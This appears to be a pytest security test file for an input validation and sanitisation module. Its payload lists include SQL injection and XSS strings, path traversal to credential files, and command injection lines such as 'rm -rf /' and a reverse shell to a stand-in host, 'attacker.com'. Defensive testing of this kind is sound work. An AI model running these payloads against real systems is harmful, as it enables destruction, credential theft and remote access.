"""
Comprehensive Input Validation Security Tests
Tests for SQL injection, XSS, Command injection, Path traversal, and more.
"""

import pytest
import json
import re
from pathlib import Path
from typing import Dict, Any, List

from input_validation import (
    InputValidator, ValidationError, ValidationRule, ValidationRuleConfig,
    Sanitizer, get_validator, get_sanitizer
)


class TestSQLInjectionPrevention:
    """Test SQL injection prevention in input validation."""
    
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1; DELETE FROM users WHERE 1=1--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND 1=1--",
        "admin' #",
        "' OR 1=1#",
        "1' EXEC master..xp_cmdshell 'dir'--",
        "') OR ('1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
        "' UNION SELECT username, password FROM admin--",
    ]
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_text_validation(self, validator, payload):
        """Test that SQL injection payloads are handled safely in text."""
        # SQL payloads should be stored as-is but sanitized when used
        result = validator._remove_script_tags(payload)
        # Should not execute or cause errors
        assert isinstance(result, str)
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_in_json_sanitization(self, validator, payload):
        """Test JSON sanitization with SQL injection payloads."""
        data = {"query": payload, "name": "test"}
        sanitized = validator._sanitize_recursive(data)
        # Should preserve structure
        assert "query" in sanitized
        assert sanitized["query"] == payload  # Stored as-is
    
    def test_sql_injection_in_problem_definition(self, validator):
        """Test problem definition validation with SQL injection."""
        problem_data = {
            'id': 'prob_123',
            'title': "'; DROP TABLE problems; --",
            'description': "<p>Valid description with SQL: '; DELETE FROM users; --</p>",
            'problem_type': 'research',
            'domain_context': {'domain': 'software_engineering'},
            'complexity_score': {'overall_complexity': 7.5},
            'constraints': [],
            'success_criteria': [],
            'stakeholders': [],
            'resources_available': {},
            'created_at': '2023-01-01T00:00:00',
            'updated_at': '2023-01-01T00:00:00',
            'metadata': {}
        }
        
        # Should validate without SQL errors
        validated = validator.validate_problem_definition(problem_data)
        assert validated['title'] == "'; DROP TABLE problems; --"  # Stored as text


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(XSS)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<div onmouseover=alert(1)>hover me</div>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<img src=\"javascript:alert(1)\">",
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">",
    ]
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_removal_in_script_tags(self, validator, payload):
        """Test that script tags and event handlers are removed."""
        sanitized = validator._remove_script_tags(payload)
        # Script tags should be removed
        assert "<script>" not in sanitized.lower()
        # javascript: protocol should be neutralized
        assert "javascript:" not in sanitized.lower()
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_html_sanitization(self, validator, payload):
        """Test HTML sanitization with bleach."""
        sanitized = validator._sanitize_html(payload)
        # Should not contain dangerous tags
        assert "<script>" not in sanitized.lower()
        assert "onerror" not in sanitized.lower()
        assert "onload" not in sanitized.lower()
    
    def test_xss_in_problem_description(self, validator):
        """Test XSS prevention in problem descriptions."""
        problem_data = {
            'id': 'prob_123',
            'title': 'Test Problem',
            'description': '<p>Description with <script>alert("XSS")</script> attack</p>',
            'problem_type': 'research',
            'domain_context': {'domain': 'test'},
            'complexity_score': {'overall_complexity': 5.0},
            'constraints': [],
            'success_criteria': [],
            'stakeholders': [],
            'resources_available': {},
            'created_at': '2023-01-01T00:00:00',
            'updated_at': '2023-01-01T00:00:00',
            'metadata': {}
        }
        
        validated = validator.validate_problem_definition(problem_data)
        # Script tags should be stripped by sanitization
        assert "<script>" not in validated['description'].lower()
    
    def test_zero_trust_fuzzing(self, validator):
        """Test the zero-trust fuzzing mechanism."""
        result = validator.run_zero_trust_fuzzing(max_rounds=3)
        # Should run without errors
        assert isinstance(result, dict)
        assert "failures" in result
        assert "patterns" in result


class TestCommandInjectionPrevention:
    """Test command injection prevention."""
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(uname -a)",
        "; rm -rf /",
        "| nc attacker.com 4444",
        "&& curl attacker.com",
        "; ping -c 10 attacker.com",
        "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "`python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444))'`",
    ]
    
    @pytest.fixture
    def sanitizer(self):
        return Sanitizer()
    
    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_filename(self, sanitizer, payload):
        """Test filename sanitization against command injection."""
        malicious_filename = f"file{payload}.txt"
        sanitized = sanitizer.sanitize_filename(malicious_filename)
        # Should remove dangerous characters
        assert ";" not in sanitized
        assert "|" not in sanitized
        assert "&" not in sanitized
        assert "`" not in sanitized
        assert "$" not in sanitized


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%2fpasswd",
        "/proc/self/environ",
        "c:\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../../../etc/shadow",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
    ]
    
    @pytest.fixture
    def sanitizer(self):
        return Sanitizer()
    
    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_filename(self, sanitizer, payload):
        """Test that path traversal attempts are sanitized."""
        sanitized = sanitizer.sanitize_filename(payload)
        # Should not contain path traversal patterns
        assert "../" not in sanitized
        assert "..\\" not in sanitized
        assert not sanitized.startswith("/")
    
    def test_filename_with_safe_characters(self, sanitizer):
        """Test that safe filenames are preserved."""
        safe_names = [
            "document.txt",
            "my_file.pdf",
            "report-2024.docx",
            "data_backup.tar.gz",
        ]
        for name in safe_names:
            sanitized = sanitizer.sanitize_filename(name)
            assert sanitized == name


class TestValidationRules:
    """Test input validation rules."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_not_empty_validation(self, validator):
        """Test NOT_EMPTY validation rule."""
        rules = [ValidationRuleConfig(ValidationRule.NOT_EMPTY)]
        
        # Valid values
        assert validator.validate("test", "field", rules) == "test"
        assert validator.validate([1, 2, 3], "field", rules) == [1, 2, 3]
        
        # Invalid values
        with pytest.raises(ValidationError):
            validator.validate("", "field", rules)
        with pytest.raises(ValidationError):
            validator.validate(None, "field", rules)
        with pytest.raises(ValidationError):
            validator.validate([], "field", rules)
    
    def test_min_max_length_validation(self, validator):
        """Test MIN_LENGTH and MAX_LENGTH validation."""
        rules = [
            ValidationRuleConfig(ValidationRule.MIN_LENGTH, 3),
            ValidationRuleConfig(ValidationRule.MAX_LENGTH, 10)
        ]
        
        assert validator.validate("hello", "field", rules) == "hello"
        
        with pytest.raises(ValidationError):
            validator.validate("hi", "field", rules)  # Too short
        
        with pytest.raises(ValidationError):
            validator.validate("this is way too long", "field", rules)  # Too long
    
    def test_email_validation(self, validator):
        """Test email format validation."""
        rules = [ValidationRuleConfig(ValidationRule.EMAIL)]
        
        valid_emails = [
            "user@example.com",
            "test.user@domain.co.uk",
            "user+tag@example.org",
        ]
        for email in valid_emails:
            assert validator.validate(email, "email", rules) == email
        
        invalid_emails = [
            "notanemail",
            "@nodomain.com",
            "spaces in@email.com",
            "missing@domain",
        ]
        for email in invalid_emails:
            with pytest.raises(ValidationError):
                validator.validate(email, "email", rules)
    
    def test_url_validation(self, validator):
        """Test URL format validation."""
        rules = [ValidationRuleConfig(ValidationRule.URL)]
        
        valid_urls = [
            "https://example.com",
            "http://localhost:8080",
            "https://api.example.com/v1/users",
        ]
        for url in valid_urls:
            assert validator.validate(url, "url", rules) == url
        
        invalid_urls = [
            "not-a-url",
            "ftp://invalid-protocol.com",
            "javascript:alert(1)",
        ]
        for url in invalid_urls:
            with pytest.raises(ValidationError):
                validator.validate(url, "url", rules)
    
    def test_type_validation(self, validator):
        """Test type validation."""
        # Integer type
        int_rules = [ValidationRuleConfig(ValidationRule.TYPE, int)]
        assert validator.validate("42", "field", int_rules) == 42
        assert validator.validate(42, "field", int_rules) == 42
        
        with pytest.raises(ValidationError):
            validator.validate("not-a-number", "field", int_rules)
        
        # Boolean type
        bool_rules = [ValidationRuleConfig(ValidationRule.TYPE, bool)]
        assert validator.validate("true", "field", bool_rules) == True
        assert validator.validate("false", "field", bool_rules) == False
        assert validator.validate(1, "field", bool_rules) == True
        assert validator.validate(0, "field", bool_rules) == False
    
    def test_range_validation(self, validator):
        """Test range validation."""
        rules = [ValidationRuleConfig(ValidationRule.RANGE, params={'min': 0, 'max': 100})]
        
        assert validator.validate(50, "field", rules) == 50
        assert validator.validate(0, "field", rules) == 0
        assert validator.validate(100, "field", rules) == 100
        
        with pytest.raises(ValidationError):
            validator.validate(-1, "field", rules)
        
        with pytest.raises(ValidationError):
            validator.validate(101, "field", rules)


class TestSchemaValidation:
    """Test schema-based validation."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_complete_schema_validation(self, validator):
        """Test validation against a complete schema."""
        schema = {
            'username': [
                ValidationRuleConfig(ValidationRule.NOT_EMPTY),
                ValidationRuleConfig(ValidationRule.MIN_LENGTH, 3),
                ValidationRuleConfig(ValidationRule.MAX_LENGTH, 20),
            ],
            'email': [
                ValidationRuleConfig(ValidationRule.NOT_EMPTY),
                ValidationRuleConfig(ValidationRule.EMAIL),
            ],
            'age': [
                ValidationRuleConfig(ValidationRule.TYPE, int),
                ValidationRuleConfig(ValidationRule.RANGE, params={'min': 0, 'max': 150}),
            ],
        }
        
        # Valid data
        valid_data = {
            'username': 'johndoe',
            'email': 'john@example.com',
            'age': 30,
        }
        result = validator.validate_schema(valid_data, schema)
        assert result['username'] == 'johndoe'
        assert result['email'] == 'john@example.com'
        assert result['age'] == 30
        
        # Invalid data
        invalid_data = {
            'username': 'ab',  # Too short
            'email': 'invalid-email',
            'age': 200,  # Out of range
        }
        with pytest.raises(ValidationError) as exc_info:
            validator.validate_schema(invalid_data, schema)
        
        error_msg = str(exc_info.value)
        assert 'username' in error_msg or 'email' in error_msg or 'age' in error_msg


class TestJSONSanitization:
    """Test JSON input sanitization."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_valid_json_sanitization(self, validator):
        """Test sanitization of valid JSON."""
        json_str = '{"name": "John", "age": 30}'
        result = validator.sanitize_json_input(json_str)
        # Should return valid JSON
        parsed = json.loads(result)
        assert parsed['name'] == 'John'
        assert parsed['age'] == 30
    
    def test_malicious_json_sanitization(self, validator):
        """Test sanitization of malicious JSON."""
        json_str = '{"name": "<script>alert(1)</script>", "data": "test"}'
        result = validator.sanitize_json_input(json_str)
        # Script tags should be removed
        assert "<script>" not in result.lower()
    
    def test_dangerous_keys_removal(self, validator):
        """Test that dangerous keys are removed from JSON."""
        json_str = '{"name": "test", "password": "secret", "api_key": "key123"}'
        result = validator.sanitize_json_input(json_str)
        parsed = json.loads(result)
        # Dangerous keys should be removed
        assert 'password' not in parsed
        assert 'api_key' not in parsed
        assert 'name' in parsed
    
    def test_invalid_json_handling(self, validator):
        """Test handling of invalid JSON."""
        with pytest.raises(ValidationError):
            validator.sanitize_json_input("not valid json")


class TestSanitizerUtilities:
    """Test sanitizer utility functions."""
    
    @pytest.fixture
    def sanitizer(self):
        return Sanitizer()
    
    def test_text_sanitization(self, sanitizer):
        """Test basic text sanitization."""
        text = '<script>alert(1)</script><p>Normal content</p>'
        sanitized = sanitizer.sanitize_text(text)
        # HTML should be escaped
        assert "&lt;script&gt;" in sanitized or "<script>" not in sanitized
    
    def test_url_sanitization(self, sanitizer):
        """Test URL sanitization."""
        # Valid HTTP URL
        assert sanitizer.sanitize_url("https://example.com") == "https://example.com"
        
        # Invalid protocols should be rejected
        with pytest.raises(ValidationError):
            sanitizer.sanitize_url("javascript:alert(1)")
        
        with pytest.raises(ValidationError):
            sanitizer.sanitize_url("file:///etc/passwd")
    
    def test_dataclass_sanitization(self, sanitizer):
        """Test dataclass sanitization."""
        from dataclasses import dataclass
        
        @dataclass
        class TestData:
            name: str
            description: str
            count: int
        
        data = TestData(
            name="<script>alert(1)</script>John",
            description="<p>Normal paragraph</p>",
            count=42
        )
        
        sanitized = sanitizer.sanitize_dataclass(data)
        # String fields should be sanitized
        assert "<script>" not in sanitized.name
        assert "&lt;script&gt;" in sanitized.name or "alert(1)" not in sanitized.name
        # Non-string fields should be unchanged
        assert sanitized.count == 42


class TestMalformedInputHandling:
    """Test handling of malformed inputs."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    MALFORMED_INPUTS = [
        None,
        "",
        "x" * 1000000,  # Very long string
        "\x00\x01\x02\x03",  # Null bytes and control characters
        "<>",
        "{{",
        "${",
        "{{7*7}}",
        "%{(#_='multipart/form-data')}",
    ]
    
    @pytest.mark.parametrize("payload", MALFORMED_INPUTS)
    def test_malformed_input_handling(self, validator, payload):
        """Test that malformed inputs are handled gracefully."""
        if payload is None:
            result = validator._remove_script_tags("")
        else:
            result = validator._remove_script_tags(str(payload)[:1000])
        # Should not crash
        assert isinstance(result, str)
    
    def test_unicode_handling(self, validator):
        """Test handling of Unicode characters."""
        unicode_strings = [
            "admin\u0430",  # Cyrillic 'a'
            "\u03C0\u03B1\u03CA\u03B4\u03AC\u03BA\u03B9\u03B1",  # Greek
            "\u8003\u8A66",  # Chinese
            "\u3042\u3044\u3046\u3048\u304A",  # Japanese
            "\U0001F600\U0001F601\U0001F602",  # Emojis
        ]
        
        for s in unicode_strings:
            result = validator._remove_script_tags(s)
            assert isinstance(result, str)
    
    def test_nested_structure_handling(self, validator):
        """Test handling of deeply nested structures."""
        # Create deeply nested dict
        nested = {"level": 0}
        current = nested
        for i in range(100):
            current["next"] = {"level": i + 1}
            current = current["next"]
        
        # Should handle without stack overflow
        result = validator._sanitize_recursive(nested)
        assert "level" in result


class TestDecompositionPlanValidation:
    """Test decomposition plan validation."""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_valid_decomposition_plan(self, validator):
        """Test validation of a valid decomposition plan."""
        plan_data = {
            'id': 'plan_123',
            'problem_id': 'prob_456',
            'strategy': 'hierarchical',
            'sub_problems': [
                {'id': 'sub1', 'name': 'Sub Problem 1'},
                {'id': 'sub2', 'name': 'Sub Problem 2'},
            ],
            'dependency_graph': {'nodes': [], 'edges': []},
            'validation_checkpoints': [],
            'quality_scores': {'overall': 0.85},
            'confidence_level': 0.9,
            'created_by': 'user_123',
            'approved_by': 'admin_123',
            'status': 'active',
            'created_at': '2023-01-01T00:00:00',
            'updated_at': '2023-01-01T00:00:00',
            'metadata': {}
        }
        
        validated = validator.validate_decomposition_plan(plan_data)
        assert validated['id'] == 'plan_123'
        assert validated['confidence_level'] == 0.9
    
    def test_confidence_level_range(self, validator):
        """Test confidence level range validation."""
        plan_data = {
            'id': 'plan_123',
            'problem_id': 'prob_456',
            'strategy': 'hierarchical',
            'sub_problems': [],
            'dependency_graph': {},
            'validation_checkpoints': [],
            'quality_scores': {},
            'confidence_level': 1.5,  # Invalid: > 1.0
            'created_by': 'user_123',
            'status': 'active',
            'created_at': '2023-01-01T00:00:00',
            'updated_at': '2023-01-01T00:00:00',
            'metadata': {}
        }
        
        with pytest.raises(ValidationError):
            validator.validate_decomposition_plan(plan_data)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
